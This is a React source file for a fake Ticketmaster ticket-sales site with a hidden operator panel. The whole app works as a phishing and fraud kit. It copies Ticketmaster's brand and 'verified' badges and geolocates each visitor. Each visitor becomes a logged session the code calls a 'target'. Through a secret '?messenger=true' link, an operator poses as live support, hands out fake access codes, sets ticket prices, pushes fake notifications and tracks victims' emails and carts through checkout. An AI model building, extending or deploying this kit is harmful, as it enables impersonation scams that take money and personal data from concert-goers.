import React, { useState, useEffect } from 'react';
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, Lock, Globe, Zap, Users } from 'lucide-react';
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc, query, orderBy } from 'firebase/firestore';
import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { auth, db, appId } from './firebase';

import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  // UI Logic
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [authMode, setAuthMode] = useState('login'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [activeNotification, setActiveNotification] = useState(null);
  const [showMemberInfo, setShowMemberInfo] = useState(false);
  const [showNotifPanel, setShowNotifPanel] = useState(false);

  // --- AUTOMATIC MESSENGER DETECTION ---
  // If URL has ?messenger=true, we skip everything and show the Messenger Dashboard
  const isMessengerLink = new URLSearchParams(window.location.search).get('messenger') === 'true';

  useEffect(() => {
    signInAnonymously(auth);
    return onAuthStateChanged(auth, setUser);
  }, []);

  useEffect(() => {
    if (!user) return;
    const initSession = async () => {
      // Don't create a target session if we are the admin in messenger mode
      if (isMessengerLink) return;

      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Unknown"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Awaiting Entry',
        userAuthCode: '', 
        notifications: [],
        chatHistory: [{ sender: 'system', text: 'Welcome to Support. Your connection is secured. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newSession.id);
    };
    initSession();
  }, [user, isMessengerLink]);

  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (snap) => snap.exists() && setGlobalSettings(snap.data()));
  }, [user]);

  // Target Session Listener
  useEffect(() => {
    if (!currentSessionId || isMessengerLink) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (snap) => {
      if (snap.exists()) {
        const d = snap.data();
        if (d.chatHistory) setChatMessages(d.chatHistory);
        if (d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length - 1]);
      }
    });
  }, [currentSessionId, isMessengerLink]);

  // Admin/Messenger Session List Listener
  useEffect(() => {
    if (!user || !isMessengerLink) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snap) => {
      setSessions(snap.docs.map(d => ({ id: d.id, ...d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isMessengerLink]);

  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const chat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...chat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  // --- RENDER MESSENGER DASHBOARD IF LINKED ---
  if (isMessengerLink) {
    return (
      <AdminMessenger 
        sessions={sessions} 
        updateSession={updateSession} 
        sendChatMessage={sendChatMessage}
        globalSettings={globalSettings}
        updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)}
      />
    );
  }

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden no-select">
      
      {/* HEADER */}
      <header className="fixed top-0 w-full z-[250] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-2xl bg-opacity-95">
        <div className="flex items-center gap-4">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="p-2.5 rounded-full hover:bg-white/10 transition-all active:scale-90">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter uppercase italic">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_15px_#026cdf]">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
          <input 
            type="text" 
            placeholder="Search millions of events..." 
            className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-5">
          <button 
            onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}}
            className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all active:scale-95"
          >
            <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
            <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
          </button>

          <button className="relative p-2.5 hover:scale-110 transition-transform active:scale-90" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
            <Bell className="w-6 h-6" />
            {(activeNotification || showNotifPanel) && <div className="absolute top-2 right-2 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce shadow-lg" />}
          </button>
        </div>

        {/* Droplist Panels */}
        {showMemberInfo && (
          <div className="absolute top-16 right-4 w-72 bg-white text-gray-900 rounded-[35px] p-7 shadow-[0_50px_100px_rgba(0,0,0,0.5)] border border-gray-100 animate-slideDown z-[300]">
            <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-4 text-center italic">Member Card</h4>
            <div className="bg-blue-50 p-5 rounded-3xl border border-blue-100 flex items-center gap-4">
              <ShieldCheck className="text-[#026cdf] w-8 h-8" />
              <p className="text-[10px] font-bold leading-tight uppercase">Fan Identity:<br/><span className="text-[#026cdf] text-xs font-black italic">AUTHENTICATED</span></p>
            </div>
          </div>
        )}

        {showNotifPanel && (
          <div className="absolute top-16 right-4 w-80 bg-[#1f262d] text-white rounded-[35px] p-7 shadow-[0_50px_100px_rgba(0,0,0,0.5)] border border-white/10 animate-slideDown z-[300]">
            <div className="flex justify-between items-center mb-6">
               <h4 className="font-black text-xs uppercase tracking-widest text-gray-500 italic">Inbox</h4>
               <X className="w-4 h-4 cursor-pointer text-gray-500 hover:text-white" onClick={() => setShowNotifPanel(false)} />
            </div>
            {activeNotification ? (
               <div className="bg-[#026cdf] p-5 rounded-3xl shadow-2xl animate-pulse">
                  <p className="text-[11px] font-black leading-tight uppercase mb-1 tracking-widest">Update</p>
                  <p className="text-xs font-bold opacity-90">{activeNotification.text}</p>
               </div>
            ) : (
               <div className="text-center py-12 opacity-20"><Bell className="mx-auto w-10 h-10 mb-3" /><p className="text-[10px] font-black uppercase tracking-[0.3em]">No News</p></div>
            )}
          </div>
        )}
      </header>

      {/* VIEWPORT CONTROLLER */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && <HomeView events={filteredEvents} searchTerm={searchTerm} setSearchTerm={setSearchTerm} onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} />}
        {currentPage === 'auth' && <AuthGate mode={authMode} setMode={setAuthMode} step={authStep} setStep={setAuthStep} tempUser={tempUser} setTempUser={setTempUser} sessionData={mySessionData} onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email }); }} />}
        {currentPage === 'seatmap' && <SeatMap event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout'); }} />}
        {currentPage === 'checkout' && <Checkout cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
      </main>

      {/* CHAT SUPPORT */}
      <div className={`fixed bottom-8 right-6 z-[180] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-90px] sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-5 rounded-[30px] shadow-[0_25px_50px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all">
          {isChatOpen ? <X className="w-7 h-7" /> : <MessageSquare className="w-7 h-7" />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-28 right-6 w-[92vw] max-w-[360px] h-[520px] bg-white border shadow-[0_40px_120px_rgba(0,0,0,0.5)] rounded-[50px] z-[190] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-[#1f262d] text-white p-7 flex justify-between items-center border-b border-white/5">
            <div className="flex items-center gap-4">
              <div className="relative">
                <div className="w-12 h-12 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-sm shadow-xl">TM</div>
                <div className="absolute bottom-0 right-0 w-4 h-4 bg-green-500 rounded-full border-4 border-[#1f262d]" />
              </div>
              <div>
                <div className="flex items-center gap-1.5">
                   <span className="font-bold text-lg tracking-tighter uppercase italic">ticketmaster</span>
                   <div className="bg-[#026cdf] rounded-full w-3.5 h-3.5 flex items-center justify-center shadow-lg"><CheckCircle className="w-2.5 h-2.5 text-white" /></div>
                </div>
                <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest italic">Live Support Verified</p>
              </div>
            </div>
            <X className="cursor-pointer text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-5 bg-gray-50/50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-4.5 rounded-[30px] text-[13px] font-bold shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800'}`}>{m.text}</div>
              </div>
            ))}
          </div>
          <div className="p-5 border-t bg-white flex gap-3">
            <input id="agent-msg" placeholder="Message..." className="flex-1 bg-gray-50 border-2 border-gray-100 p-5 rounded-[30px] text-sm font-bold focus:border-[#026cdf] outline-none transition-all" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
            <button onClick={() => { const i = document.getElementById('agent-msg'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-4.5 rounded-[30px] shadow-2xl hover:bg-blue-700 active:scale-90 transition-all"><Send className="w-5 h-5" /></button>
          </div>
        </div>
      )}
    </div>
  );
}

// --- CORE VIEWS ---

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-12 space-y-16 pb-40">
      <div className="relative h-[550px] rounded-[80px] overflow-hidden shadow-[0_50px_100px_rgba(0,0,0,0.5)] flex flex-col items-center justify-center p-8 text-center border-4 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-[#0a0e14]/40 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[30s] group-hover:scale-110 opacity-60" alt="Hero" />
        <div className="relative z-20 text-white max-w-5xl animate-fadeIn space-y-8 pb-16">
          <h1 className="text-6xl md:text-[11rem] font-black tracking-tighter leading-none italic uppercase drop-shadow-[0_20px_60px_rgba(0,0,0,1)]">LET'S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_50px_#026cdf]">MEMORIES</span>.</h1>
          <p className="text-xl md:text-3xl font-black text-gray-300 opacity-95 max-w-2xl mx-auto italic tracking-tight uppercase">Official verified access to the world's elite tours.</p>
        </div>
        <div className="relative z-30 w-full max-w-2xl mt-[-40px]">
          <div className="bg-white/10 backdrop-blur-3xl border border-white/20 rounded-[50px] p-3 flex shadow-[0_40px_80px_rgba(0,0,0,0.6)] group focus-within:bg-white transition-all duration-500">
             <input className="flex-1 bg-transparent px-8 py-5 rounded-full text-white font-black placeholder:text-white/40 focus:outline-none focus:text-gray-900 text-lg" placeholder="Find your next tour access..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
             <button className="bg-[#026cdf] px-16 py-6 rounded-[40px] font-black text-base uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic">GO</button>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-14">
        {events.map(ev => (
          <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[70px] overflow-hidden shadow-2xl border-2 border-white/5 hover:translate-y-[-20px] transition-all duration-700 cursor-pointer group hover:border-[#026cdf]/30">
            <div className="h-80 relative overflow-hidden">
               <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[5s]" alt={ev.artist} />
               <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-90" />
               <div className="absolute top-10 left-10 flex flex-col gap-4">
                  <div className="bg-[#ea0042] text-white px-6 py-2.5 rounded-full text-[10px] font-black uppercase shadow-2xl animate-pulse tracking-widest border border-white/10">High Demand</div>
                  {ev.timeRemaining !== "00:00:00" && <div className="bg-black/50 backdrop-blur-xl text-white px-4 py-2 rounded-full text-[9px] font-black uppercase border border-white/10 tracking-widest italic">{ev.timeRemaining}</div>}
               </div>
            </div>
            <div className="p-14 space-y-10">
               <h3 className="text-4xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic tracking-tighter">{ev.artist}</h3>
               <div className="pt-8 border-t border-white/5 flex justify-between items-center"><div className="flex items-center gap-3"><ShieldCheck className="w-5 h-5 text-[#026cdf]" /><span className="text-[11px] font-black uppercase text-[#026cdf] tracking-[0.3em] italic">Verified Access</span></div><div className="bg-white/5 p-3 rounded-full group-hover:bg-[#026cdf] transition-all"><ChevronLeft className="w-6 h-6 rotate-180" /></div></div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => {
    setLoading(true); setError('');
    setTimeout(() => {
      setLoading(false);
      if(step==='email') setStep(mode==='login' ? 'verify' : 'signup');
      else if(step==='signup') setStep('verify');
      else {
        if (vCode.trim() === sessionData.userAuthCode && vCode.trim() !== '') onComplete();
        else setError("Invalid Fan Code.");
      }
    }, 1500);
  };

  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6">
      <div className="bg-white w-full max-w-md rounded-[75px] shadow-2xl p-14 space-y-12 animate-slideUp relative">
        <div className="absolute top-10 right-14 flex gap-8 text-[11px] font-black uppercase italic">
           <button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf]' : 'text-gray-300'}>Login</button>
           <button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf]' : 'text-gray-300'}>Register</button>
        </div>
        <div className="text-center pt-10">
           <div className="w-24 h-24 bg-blue-50 rounded-[45px] flex items-center justify-center mx-auto mb-8 shadow-inner"><User className="text-[#026cdf] w-12 h-12" /></div>
           <h2 className="text-5xl font-black italic tracking-tighter uppercase">{mode === 'login' ? 'Sign In' : 'Sign Up'}</h2>
           <p className="text-gray-400 text-[10px] font-black uppercase tracking-[0.4em] mt-3 opacity-50 italic">Verified Fan Gate</p>
        </div>
        {step === 'email' && (
          <div className="space-y-8">
            <input className="w-full border-4 border-gray-50 bg-gray-50/50 p-7 rounded-[35px] font-black focus:border-[#026cdf] focus:bg-white outline-none transition-all text-xl italic" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
            <button onClick={next} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-lg italic shadow-[0_20px_50px_rgba(2,108,223,0.5)]">Continue Access</button>
          </div>
        )}
        {step === 'signup' && (
          <div className="space-y-4 animate-fadeIn">
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" placeholder="Legal Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
            <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black outline-none italic text-lg" type="password" placeholder="Passkey" />
            <button onClick={next} className="w-full bg-black text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-lg italic">Create Profile</button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-10 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-8 rounded-[40px] border-4 border-dashed border-[#026cdf]/20 text-center">
                <p className="text-[11px] text-[#026cdf] font-black leading-relaxed uppercase tracking-[0.2em] italic">Identity Required. Message Support Agent to receive your access code.</p>
             </div>
             <input className={`w-full border-4 p-8 rounded-[40px] text-center font-black tracking-[1em] text-5xl outline-none transition-all shadow-inner ${error ? 'border-red-500 text-red-600' : 'border-gray-50 bg-gray-50'}`} placeholder="0000" value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl uppercase tracking-widest italic text-xl">Verify & Unlock</button>
          </div>
        )}
      </div>
    </div>
  );
}

// --- DEDICATED MESSENGER COMMAND CENTER ---
function AdminMessenger({ sessions, updateSession, sendChatMessage, globalSettings, updateGlobalSettings }) {
  const [selectedSid, setSelectedSid] = useState(null);
  const [localConfig, setLocalConfig] = useState(globalSettings);
  const activeTarget = sessions.find(s => s.id === selectedSid);

  return (
    <div className="min-h-screen bg-[#f1f5f9] flex flex-col md:flex-row h-screen overflow-hidden italic no-select">
      {/* Target Sidebar */}
      <div className="w-full md:w-96 bg-white border-r flex flex-col shadow-2xl z-20">
        <div className="p-8 bg-[#1f262d] text-white flex justify-between items-center border-b border-white/5">
           <div><h1 className="text-2xl font-black italic tracking-tighter">MESSENGER</h1><p className="text-[8px] font-black uppercase tracking-widest text-green-500">System Live</p></div>
           <Users className="w-6 h-6 opacity-30" />
        </div>
        <div className="flex-1 overflow-y-auto bg-gray-50/50">
           {sessions.map(s => (
             <div 
               key={s.id} 
               onClick={() => setSelectedSid(s.id)}
               className={`p-6 border-b cursor-pointer transition-all ${selectedSid === s.id ? 'bg-[#026cdf] text-white shadow-xl translate-x-2' : 'hover:bg-blue-50'}`}
             >
                <div className="flex justify-between items-start mb-2">
                   <p className="font-black text-sm uppercase tracking-tighter truncate max-w-[150px]">{s.name || 'Visitor'}</p>
                   <p className={`text-[8px] font-bold px-2 py-0.5 rounded-full uppercase ${selectedSid === s.id ? 'bg-white/20' : 'bg-blue-100 text-blue-600'}`}>{s.status}</p>
                </div>
                <p className={`text-[10px] font-black uppercase tracking-widest ${selectedSid === s.id ? 'opacity-80' : 'text-gray-400'}`}>{s.location}</p>
                <p className={`text-[9px] mt-1 italic ${selectedSid === s.id ? 'opacity-60' : 'text-gray-300'}`}>{s.email}</p>
             </div>
           ))}
        </div>
        {/* Global Quick Tools */}
        <div className="p-6 bg-white border-t space-y-4">
           <div className="flex gap-4">
              <input type="number" className="w-1/2 border-2 p-2 rounded-xl text-xs font-black" value={localConfig.price} onChange={e=>setLocalConfig({...localConfig, price: Number(e.target.value)})} />
              <button onClick={() => updateGlobalSettings(localConfig)} className="w-1/2 bg-[#026cdf] text-white text-[10px] font-black rounded-xl uppercase">Sync $</button>
           </div>
        </div>
      </div>

      {/* Main Chat & Controls */}
      <div className="flex-1 flex flex-col bg-white">
        {activeTarget ? (
          <>
            <div className="p-8 border-b bg-white flex justify-between items-center shadow-sm">
               <div className="flex items-center gap-5">
                  <div className="w-16 h-16 bg-[#026cdf] rounded-3xl flex items-center justify-center font-black text-white text-xl shadow-xl italic">TM</div>
                  <div>
                    <h2 className="text-3xl font-black tracking-tighter uppercase italic text-blue-950">{activeTarget.name || 'Anonymous User'}</h2>
                    <p className="text-[10px] font-bold uppercase tracking-widest text-gray-400">{activeTarget.location} • {activeTarget.id}</p>
                  </div>
               </div>
               <div className="flex gap-4">
                  <button onClick={() => updateSession(activeTarget.id, {status: 'verified'})} className="bg-green-600 text-white px-6 py-3 rounded-2xl font-black text-[10px] uppercase shadow-xl hover:bg-green-700 transition-all">Settle</button>
               </div>
            </div>

            <div className="flex-1 p-10 overflow-y-auto bg-gray-50/30 space-y-6 flex flex-col">
               {activeTarget.chatHistory?.map((m, i) => (
                 <div key={i} className={`flex ${m.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                    <div className={`max-w-[70%] p-6 rounded-[35px] text-sm font-bold shadow-md ${m.sender === 'user' ? 'bg-white text-gray-800 rounded-bl-none border-2 border-gray-100' : 'bg-[#026cdf] text-white rounded-br-none shadow-blue-500/20'}`}>
                      {m.text}
                    </div>
                 </div>
               ))}
            </div>

            {/* Admin Command Bar */}
            <div className="p-8 border-t bg-white space-y-6">
               <div className="flex gap-6 items-center">
                  <div className="flex-1 bg-gray-50 p-4 rounded-[30px] border-2 border-gray-100 flex items-center gap-4">
                     <p className="text-[10px] font-black uppercase text-gray-400 w-24">Assign Code</p>
                     <input className="flex-1 bg-transparent font-black text-[#026cdf] text-3xl outline-none" placeholder="XXXX" onBlur={(e) => updateSession(activeTarget.id, { userAuthCode: e.target.value.trim() })} defaultValue={activeTarget.userAuthCode} />
                  </div>
                  <div className="flex-1 bg-gray-50 p-4 rounded-[30px] border-2 border-gray-100 flex items-center gap-4">
                     <p className="text-[10px] font-black uppercase text-gray-400 w-24">Deploy Bell</p>
                     <input className="flex-1 bg-transparent font-bold text-xs outline-none uppercase" placeholder="Ping Message..." id="ping-msg" />
                     <button onClick={() => { const i = document.getElementById('ping-msg'); updateSession(activeTarget.id, { notifications: [...(activeTarget.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=''; }} className="bg-red-600 text-white px-5 py-2 rounded-xl font-black text-[10px] uppercase italic">PING</button>
                  </div>
               </div>
               <div className="flex gap-4">
                  <input id="admin-reply" placeholder="Send secure message to target..." className="flex-1 bg-gray-100 border-none p-6 rounded-[35px] font-bold text-base outline-none italic" onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(activeTarget.id, e.target.value, 'system'); e.target.value='' } }} />
                  <button onClick={() => { const i = document.getElementById('admin-reply'); if(i.value.trim()){ sendChatMessage(activeTarget.id, i.value, 'system'); i.value=''; } }} className="bg-[#026cdf] text-white p-6 rounded-[35px] shadow-2xl hover:bg-blue-700 transition-all active:scale-90"><Send className="w-7 h-7" /></button>
               </div>
            </div>
          </>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center opacity-10 animate-pulse">
             <MessageSquare className="w-48 h-48 mb-8" />
             <h3 className="text-4xl font-black uppercase tracking-[1em]">INBOX EMPTY</h3>
          </div>
        )}
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      <div className="absolute inset-0 pointer-events-none opacity-40">
         {[...Array(50)].map((_, i) => (<div key={i} className={`absolute w-3 h-14 bg-white/40 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*3}s`, top: `-100px` }} />))}
      </div>
      <div className={`bg-white w-full max-w-lg rounded-[80px] p-16 text-center shadow-[0_120px_250px_rgba(0,0,0,0.6)] transition-all duration-1000 transform ${showPrize ? 'scale-100 opacity-100' : 'scale-50 opacity-0 translate-y-40'}`}>
         <div className="w-36 h-36 bg-green-500 rounded-[50px] flex items-center justify-center mx-auto mb-12 shadow-[0_30px_80px_rgba(34,197,94,0.4)] animate-bounce"><CheckCircle className="text-white w-18 h-18 stroke-[4]" /></div>
         <h1 className="text-6xl font-black text-gray-900 leading-tight mb-6 uppercase italic tracking-tighter italic">YOU GOT THE TICKETS!</h1>
         <div className="bg-gray-50 rounded-[60px] p-14 border-8 border-dashed border-gray-100 mb-14 space-y-6 shadow-inner text-center">
            <Ticket className="w-16 h-16 text-[#026cdf] mx-auto mb-4 animate-pulse" />
            <div className="flex flex-col items-center justify-center gap-4">
               <div className="flex items-center justify-center gap-2">
                 <span className="font-bold text-3xl tracking-tighter uppercase italic">ticketmaster</span>
                 <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-lg"><CheckCircle className="w-3.5 h-3.5 text-white" /></div>
               </div>
               <p className="text-8xl font-black text-gray-900 tracking-tighter italic drop-shadow-sm">${total}</p>
            </div>
         </div>
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-8 rounded-[40px] font-black text-2xl hover:bg-black uppercase tracking-widest italic shadow-[0_30px_80px_rgba(0,0,0,0.4)] transition-all active:scale-95">OPEN RECEIPT</button>
      </div>
    </div>
  );
}

